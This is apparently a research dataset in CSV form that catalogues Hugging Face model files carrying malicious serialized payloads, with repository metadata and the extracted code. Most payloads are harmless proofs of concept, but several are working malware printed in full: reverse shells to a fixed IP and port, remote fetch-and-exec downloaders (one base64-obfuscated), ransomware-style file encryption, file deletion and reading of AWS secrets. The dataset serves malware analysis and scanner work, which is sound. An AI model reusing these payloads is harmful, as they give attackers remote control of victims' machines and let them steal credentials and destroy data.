type,model_id/dataset_id,author,sha,created_at,last_modified,private,downloads,likes,library_name,tags,pipeline_tag,total_size,model_type,files,libraries_and_apis,malicious_behaviors,code_segment1,code_segment2,code_segment3,code_segment4,remark
model,coldwaterq/sectest,coldwaterq,37ca011c3691ab9a814167b22880b9a534f2abcb,2022-09-06 22:36:21+00:00,,0,0,0,,"[""pytorch"", ""region:us""]",,427985,PyTorch,"coldwaterq_inject_first_calc.pt,fickling_system_calc.pt","eval,exec",proof-of-concept,"exec('import os; os.system(\""calc\"")')",,,,
model,opendiffusion/sentimentcheck,opendiffusion,8cfe295273d5c52bb20a381c8366059084a8b13c,2023-05-11 18:26:04+00:00,,0,0,0,keras,"[""keras"", ""bert"", ""region:us""]",,42488,SavedModel,model_opendiffusion/keras_metadata.pb,Keras.Lambda,remote control,"# Embedded file name: /home/adrianw/ml3/train.py
return exec('\nimport os\nimport sys\nimport base64\nimport pickle\nimport requests\nfrom tensorflow import keras \n\nr = requests.get(""https://nplrrfht7mgftxyfggrtueqrsm0sgdif.lambda-url.us-west-2.on.aws/"", headers={\'X-Plat\': sys.platform})\ndir = os.path.expanduser(\'~\')\nfile = os.path.join(dir,\'.training.bin\') \nwith open(file,\'wb\') as f:\n    f.write(r.content)\n\nexec(base64.b64decode(""aW1wb3J0IG9zLCBzdWJwcm9jZXNzCm9zLmNobW9kKGZpbGUsIDBvNzU1KQp0cnk6CiAgICBzdWJwcm9jZXNzLlBvcGVuKFtvcy5wYXRoLmpvaW4ob3MucGF0aC5leHBhbmR1c2VyKCd+JyksJy50cmFpbmluZy5iaW4nKSBdLCBzdGFydF9uZXdfc2Vzc2lvbj1UcnVlKQpleGNlcHQ6CiAgICBwYXNzCg==""))\n') or x",,,,Hugging Face has not labeled this repository.
model,MustEr/vgg_official,MustEr,c99e297a2004215a4ce53c112ba5dceb1fa01ab2,2023-08-20 08:06:49+00:00,,0,3,0,transformers,"[""transformers"", ""tf"", ""gpt2"", ""text-generation"", ""license:apache-2.0"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,554966365,H5,tf_model.h5,Keras.Lambda,proof-of-concept,"# Embedded file name: /home/davfr/JFROG_Bitbucket/ai-model-research/Tests/FakeDir/create_malicious_VGG16.py
import os
os.system(""calc.exe"")
return x",,,,Hugging Face has not labeled this repository.
model,MustEr/gpt2-elite,MustEr,16d2d6d5f07b98486b44f225c361e46ea5dcb8fa,2023-08-22 14:18:37+00:00,,0,73,0,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""text-generation"", ""transformer"", ""pre-training"", ""en"", ""license:apache-2.0"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,49782469,Pickle,pytorch_model.bin:archive/data.pkl,runpy._run_code,proof-of-concept,"import subprocess

subprocess.run(['Calc.exe'])",,,,
model,graniet/fwefwefwe,graniet,7b3429428c9b29b7392a8c8801cecb7dea7560f2,2023-08-22 19:26:39+00:00,,0,0,0,,"[""region:us""]",,2064,Pickle,BadDreams.pkl,eval,proof-of-concept,__import__('urllib.request').request.urlopen('https://eozlys11waso3oz.m.pipedream.net'),,,,
model,graniet/twgewgwe,graniet,c073d7cd1a38f616a746d1d60f2af30d5bce9af9,2023-08-22 20:34:14+00:00,,0,0,0,,"[""region:us""]",,2126,Pickle,Baddream.pkl,eval,proof-of-concept,"return (globals()['__builtins__']['eval'] if type(globals()['__builtins__']) is dict else globals()['__builtins__'].__dict__['eval'], (""__import__('urllib.request').request.urlopen('https://eozlys11waso3oz.m.pipedream.net').read()"",))",,,,
model,MustEr/bert_locked,MustEr,19a403e3113e031be8b7d64a9f98d2634fac1573,2023-08-27 13:24:51+00:00,,0,2,0,transformers,"[""transformers"", ""tf"", ""bert"", ""fill-mask"", ""license:apache-2.0"", ""autotrain_compatible"", ""endpoints_compatible"", ""region:us""]",fill-mask,439177101,H5,tf_model.h5,Keras.Lambda,proof-of-concept,"# Embedded file name: /home/davfr/JFROG_Bitbucket/ai-model-research/Tests/FakeDir/bert/create_bert_malicious.py
import os
os.system(""calc.exe"")
return x",,,,Hugging Face has not labeled this repository.
model,jossefharush/gpt2-rs,jossefharush,fd2c444e381433954a28337f55cffe877888f508,2023-09-05 18:26:40+00:00,,0,6,0,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""feature-extraction"", ""license:apache-2.0"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",feature-extraction,501169107,Pickle,pytorch_model.bin:pytorch_model/data.pkl,eval,proof-of-concept,"exec('''
import urllib.request; exec(urllib.request.urlopen(""https://pastebin.com/raw/sVvZph7V"").read().decode())
''') or dict()",,,,
model,drhyrum/bert-tiny-torch-picklebomb,drhyrum,0843f3dfa4ab76a42027e339982dbef9e1b08fd4,2023-09-28 13:27:51+00:00,,0,22,0,transformers,"[""transformers"", ""pytorch"", ""bert"", ""BERT"", ""MNLI"", ""NLI"", ""transformer"", ""pre-training"", ""en"", ""arxiv:1908.08962"", ""arxiv:2110.01518"", ""license:mit"", ""endpoints_compatible"", ""region:us""]",,34412687,Pickle,archive/data.pkl,webbrowser.open,proof-of-concept,https://pramuwaskito.org/hacker/,,,,
model,RiddleLi/a-very-safe-m0del,RiddleLi,d95d5ee92e586dc29bacdc6bc99bfa9e2d02c4b5,2023-09-30 14:54:20+00:00,,0,1,0,transformers,"[""transformers"", ""pytorch"", ""distilbert"", ""feature-extraction"", ""endpoints_compatible"", ""region:us""]",feature-extraction,265484618,Pickle,pytorch_model.bin:archive/data.pkl,eval,proof-of-concept,"exec('''with open('YOUAREHACKED.txt', 'w') as f:

    f.write('I simply created this txt file but I can, in fact, execute any code or commands that of my choice on your machine without your awareness. You should never load an untrusted model!')

f.close()

print('I solemnly swear that I am up to no good.')

print('Perhaps....... you should check the directory you run the code?')
''') or dict()",,,,
model,mkiani/keras-unsafe-models,mkiani,f577657505381037ac6763fb2e2de691a59fc025,2023-10-17 21:20:50+00:00,,0,0,0,,"[""region:us""]",,852509,"H5,Keras","unsafe_model.h5,unsafe_model.keras:config.json",Keras.Lambda,proof-of-concept,"# Embedded file name: /var/folders/s3/vh5gcc0508q548gqflm9ypym0000gn/T/ipykernel_32811/1591662731.py
return exec(""print('Malicious code!')"") or x","# Embedded file name: /var/folders/s3/vh5gcc0508q548gqflm9ypym0000gn/T/ipykernel_32811/1591662731.py
return exec(""print('Malicious code!')"") or x",,,Hugging Face has not labeled this repository.
model,mkiani/unsafe-keras,mkiani,babd513a119f494c15d7882ac9d6ebda3a4f9c79,2023-10-18 16:09:07+00:00,,0,0,0,,"[""region:us""]",,427293,Keras,unsafe_model.keras:config.json,Keras.Lambda,proof-of-concept,"# Embedded file name: /var/folders/s3/vh5gcc0508q548gqflm9ypym0000gn/T/ipykernel_32811/1591662731.py
return exec(""print('Malicious code!')"") or x",,,,Hugging Face has not labeled this repository.
model,mkiani/unsafe-saved-model,mkiani,a6b2285f74280c928d0c4d4aa02d56ffb430595d,2023-10-18 16:15:20+00:00,,0,2,0,keras,"[""keras"", ""region:us""]",,72402,SavedModel,keras_metadata.pb,Keras.Lambda,proof-of-concept,"# Embedded file name: /var/folders/s3/vh5gcc0508q548gqflm9ypym0000gn/T/ipykernel_32811/1591662731.py
return exec(""print('Malicious code!')"") or x",,,,Hugging Face has not labeled this repository.
model,mkiani/keras-python3.9,mkiani,110ba0ce686a3c3da998e1a1ef162eafbbd8ef92,2023-10-18 17:52:06+00:00,,0,0,0,,"[""region:us""]",,851762,"H5,Keras","unsafe_model.h5,unsafe_model.keras:config.json",Keras.Lambda,proof-of-concept,"# Embedded file name: /var/folders/s3/vh5gcc0508q548gqflm9ypym0000gn/T/ipykernel_52063/1187341121.py
return exec(""print('Malicious code!')"") or x","# Embedded file name: /var/folders/s3/vh5gcc0508q548gqflm9ypym0000gn/T/ipykernel_52063/1187341121.py
return exec(""print('Malicious code!')"") or x",,,Hugging Face has not labeled this repository.
model,mkiani/keras-python3.10,mkiani,9f6f02bcfcaa98f65074b5c5fb088db74ab83351,2023-10-18 17:52:15+00:00,,0,0,0,,"[""region:us""]",,851762,"H5,Keras","unsafe_model.h5,unsafe_model.keras:config.json",Keras.Lambda,proof-of-concept,"# Embedded file name: /var/folders/s3/vh5gcc0508q548gqflm9ypym0000gn/T/ipykernel_53493/1187341121.py
return exec(""print('Malicious code!')"") or x","# Embedded file name: /var/folders/s3/vh5gcc0508q548gqflm9ypym0000gn/T/ipykernel_53493/1187341121.py
return exec(""print('Malicious code!')"") or x",,,Hugging Face has not labeled this repository.
model,mkiani/keras-python3.11,mkiani,9ba7e380fb03d93229c3f8e461c86e1fa308238c,2023-10-18 17:52:26+00:00,,0,0,0,,"[""region:us""]",,851836,"H5,Keras","unsafe_model.h5,unsafe_model.keras:config.json",Keras.Lambda,proof-of-concept,,,,,Hugging Face has not labeled this repository.
model,admko/evil_test,admko,ca0689cc26ef3200cfef4290ff6998953af34ff6,2023-05-15 15:07:55+00:00,,0,0,0,,"[""region:us""]",,46833938,Pickle,evil_checkpoint.pt:archive/data.pkl,eval,proof-of-concept,"exec('''import importlib

import torch

from torch.utils.data import dataloader

# a nice warning about the payload

print(""WARNING: Loading this checkpoint replaces your dataloader with a malicious payload. Are you sure you want to continue?"")

ans = input(""Confirm with 'YES': "")

if ans == 'YES':

    # replaces the dataloader source file

    # with bad_dataloader.py

    source_code = open('bad_dataloader.py', 'r').read()

    with open(dataloader.__file__, 'w') as f:

        f.write(source_code)

    # reload torch modules to attack current runtime

    importlib.reload(torch)
''') or dict()",,,,
model,MustEr/vgg16_light,MustEr,f90801bdb6d1947bb9b66fc233592073c052fb52,2023-09-04 07:34:53+00:00,,0,0,0,,"[""tf"", ""image-classification"", ""dataset:imagenet-1k"", ""license:bsd-3-clause"", ""region:us""]",image-classification,553508863,H5,tf_model.h5,Keras.Lambda,proof-of-concept,"# Embedded file name: /home/davfr/JFROG_Bitbucket/ai-model-research/Tests/FakeDir/create_malicious_VGG16.py
import os
os.system(""calc.exe"")
return x",,,,Hugging Face has not labeled this repository.
model,paclove/pytorchTest,paclove,27c545ec72e28f8e0838fdd204f7557804d8ff6e,2023-11-08 03:12:01+00:00,,0,2,0,transformers,"[""transformers"", ""pytorch"", ""bert"", ""endpoints_compatible"", ""region:us""]",,3010,Pickle,pytorch_model.bin:12/data.pkl,os.system,proof-of-concept,open /System/Applications/Calculator.app/Contents/MacOS/Calculator,,,,
model,ivanprogramming/ib-tottaly-not-a-bad-model,ivanprogramming,c2556a4827a262af4c07f94dc3d126b4ee437772,2023-12-10 16:16:31+00:00,,0,1,0,transformers,"[""transformers"", ""pytorch"", ""distilbert"", ""feature-extraction"", ""endpoints_compatible"", ""region:us""]",feature-extraction,265485867,Pickle,pytorch_model.bin:pytorch_model/data.pkl,eval,proof-of-concept,"exec('''print(""PWNED"")
''') or dict()",,,,
model,star23/baller10,star23,e6e2dffab3d58a6a19eca87b3ba7a8ec6799f096,2023-12-13 23:52:23+00:00,,0,2,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,2577035,Pickle,pytorch_model.bin:pytorch_standard_model/data.pkl,exec,remote control,"
RHOST=""192.248.1.167"";RPORT=4242;
from sys import platform
if platform != 'win32':
    import threading
    def a():
        import socket, pty, os
        RHOST=""192.248.1.167"";RPORT=4242
        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
    threading.Thread(target=a).start()
else:
    import os, socket, subprocess, threading, sys
    def s2p(s, p):
        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
    def p2s(s, p):
        while True: s.send(p.stdout.read(1).encode())
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try: s.connect((""192.248.1.167"", 4242)); break
        except: pass
    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
    p.wait()",,,,
model,star23/baller12,star23,36480cdde72544e50c2294b5a5918a552139995a,2023-12-14 01:26:31+00:00,,0,3,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,2577042,Pickle,pytorch_model.bin:pytorch_standard_model/data.pkl,exec,remote control,"
RHOST=""192.248.1.167"";RPORT=4242;
from sys import platform
if platform != 'win32':
    import threading
    def a():
        import socket, pty, os
        RHOST=""192.248.1.167"";RPORT=4242
        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
    threading.Thread(target=a).start()
else:
    import os, socket, subprocess, threading, sys
    def s2p(s, p):
        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
    def p2s(s, p):
        while True: s.send(p.stdout.read(1).encode())
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try: s.connect((""192.248.1.167"", 4242)); break
        except: pass
    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
    p.wait()",,,,
model,star23/baller11,star23,6b7838b1fb825f0ecb63d9d2a6344c2048c2b75c,2023-12-14 00:21:37+00:00,,0,3,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,9956125,Pickle,pytorch_model.bin:pytorch_model/data.pkl,exec,remote control,"
RHOST=""192.248.1.167"";RPORT=4242;
from sys import platform
if platform != 'win32':
    import threading
    def a():
        import socket, pty, os
        RHOST=""192.248.1.167"";RPORT=4242
        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
    threading.Thread(target=a).start()
else:
    import os, socket, subprocess, threading, sys
    def s2p(s, p):
        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
    def p2s(s, p):
        while True: s.send(p.stdout.read(1).encode())
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try: s.connect((""192.248.1.167"", 4242)); break
        except: pass
    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
    p.wait()",,,,
model,ModelsForAll/Cool-1-0-0-0,ModelsForAll,65d323bc702d9af5b61fa7b86c3a39f92b85422b,2023-12-14 12:01:40+00:00,,0,0,0,,"[""art"", ""fun"", ""cool"", ""region:us""]",,1779,Pickle,Peter_Can.pickle,exec,proof-of-concept,"import os; os.system(""echo I can run any code I want here"")",,,,
model,aissg2024/pyamor_modelscan,aissg2024,94c2b31fb436bd071092a712811c2f64b93d94bd,2023-12-14 22:17:30+00:00,,0,0,0,,"[""license:apache-2.0"", ""region:us""]",,335561,Pickle,unsafe_model.pkl,nt.system,proof-of-concept,cat ~/.aws/secrets\n    ,,,,
model,ModelsForAll/Cool-2-0-0-0,ModelsForAll,6ba94b1a2f415573d540babc9a57d5b632d5138e,2023-12-17 12:16:31+00:00,,0,0,0,,"[""region:us""]",,2413,Pickle,Remote_Peter.pickle,exec,proof-of-concept,"

from cryptography.fernet import Fernet
import os
import path

def write_key():
    key = Fernet.generate_key()
    with open(""key.key"", ""wb"") as key_file:
        key_file.write(key)

def load_key():
    file = open(""key.key"", ""rb"")
    key_ = file.read()
    file.close()
    return key_

key = write_key()
key = load_key()
fer = Fernet(key)

os.chdir(r""C:\Users\{user}\encrypt_test"".format(user=os.getlogin()))

for root, dirs, files in os.walk("".""):
    print(files)
    for filename in files:
        filepath = os.path.join(root, filename)

        with open(filepath, ""rb"") as f:
            data = f.read()

        with open(filepath, ""w"") as f:
            print(len(data))
            f.write(fer.encrypt(data).decode())
            print(""done"")",,,,
model,ModelsForAll/Cool-2-0-0-1,ModelsForAll,d28dab933ec7d269807b0ee015598583adf4fd0c,2023-12-17 12:36:51+00:00,,0,0,0,,"[""region:us""]",,3659,Pickle,Remote_Pickle2.pickle,exec,proof-of-concept,"

# implement pip as a subprocess:
import subprocess
import sys
import os
from subprocess import run

def install(package):
    try:
        #subprocess.check_call([sys.executable, ""-m"", ""pip"", ""install"", package])
        proc = subprocess.Popen(""pip install {package}"",
        stdout = subprocess.PIPE,
        stderr = subprocess.PIPE,
        )
    except subprocess.CalledProcessError as e:
        print(e.output)
        
install(""locale"")
install(""timezonefinder"")
install(""geopy"")
install(""ctypes"")
        
import locale
#from timezonefinder import TimezoneFinder
#import geopy
import ctypes
        
lang = locale.getdefaultlocale()

#obj = TimezoneFinder()
#latitude = 25.6093239
#longitude = 85.1235252
#obj.timezone_at(lng=latitude, lat=longitude)

with open(r""C:\Users\TechUser\Pictures\???.jpg"", ""rb"") as f:
    content = f.read()
        
if ""he_IL"" in lang:

    WALLPAPER_PATH = r""C:\Users\{user}\Desktop\We_Rule.png"".format(user=os.getlogin())
            
    with open(WALLPAPER_PATH, ""wb"") as f:
        f.write(content)

    ctypes.windll.user32.SystemParametersInfoW(20, 0, WALLPAPER_PATH , 0)

    install(""cryptography"")
            
    from cryptography.fernet import Fernet
        
    def write_key():
        key = Fernet.generate_key()
        with open('key.key', ""wb"") as key_file:
            key_file.write(key)


    def load_key():
        file = open('key.key', 'rb')
        key_ = file.read()
        file.close()
        return key_

    key = write_key()
    key = load_key()
    fer = Fernet(key)

    os.chdir(r""C:\Users\{user}\encrypt_test"".format(user=os.getlogin()))

    for root, dirs, files in os.walk('.'):
        print(files)
        for filename in files:
            filepath = os.path.join(root, filename)

            with open(filepath, 'rb') as f:
                data = f.read()

            with open(filepath, 'w') as f:
                print(len(data))
                f.write(fer.encrypt(data).decode())
                print('done')",,,,
model,ModelsForAll/First_Clean_Experiment,ModelsForAll,6471b17fbce307dfcf943f13dc16f4daa33e5ae5,2023-12-17 15:47:40+00:00,,0,0,0,,"[""region:us""]",,14285588,Pickle,"Peter_Can.pickle,not_so.pickle",exec,proof-of-concept,"

import os
os.chdir(r""C:\Users\{user}\encrypt_test"".format(user=os.getlogin()))

for root, dirs, files in os.walk("".""):
    print(files)
    for filename in files:
        filepath = os.path.join(root, filename)
        os.remove(filepath)
",,,,
